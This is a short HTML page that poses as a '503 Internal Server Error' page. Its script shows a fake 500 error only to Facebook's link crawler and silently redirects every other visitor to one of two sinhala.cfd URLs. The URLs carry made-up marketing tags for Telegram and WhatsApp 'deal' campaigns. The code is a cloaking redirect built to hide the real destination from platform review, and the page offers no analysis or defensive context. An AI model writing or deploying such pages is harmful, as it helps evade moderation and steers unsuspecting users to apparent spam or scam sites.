<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>503 Internal Server Error</title>
    <script>
        window.onload = function() {
            // Check the user agent
            const userAgent = navigator.userAgent;

            // Simulate checking for Facebook's crawler
            if (userAgent.includes('facebookexternalhit')) {
                // Simulate sending a 500 error response
                document.body.innerHTML = "<h1>500 Internal Server Error</h1>";
                return; // Stop further execution
            }

            // Otherwise, redirect to a random page
            const pages = [
                "https://sinhala.cfd/zehra?utm_source=telegram&utm_medium=email&utm_campaign=valentines_day&utm_term=deal%2Btoday-only%2Bmembers-only&utm_content=lead_gen_form",
                "https://sinhala.cfd/zehra?utm_source=whatsapp&utm_medium=social&utm_campaign=grand_opening&utm_term=blowout%2Bfeatured-deal%2Btimed-offer&utm_content=audio_ad"
            ];
            const randomPage = pages[Math.floor(Math.random() * pages.length)];
            window.location.href = randomPage;
        };
    </script>
</head>
<body>
</body>
</html>
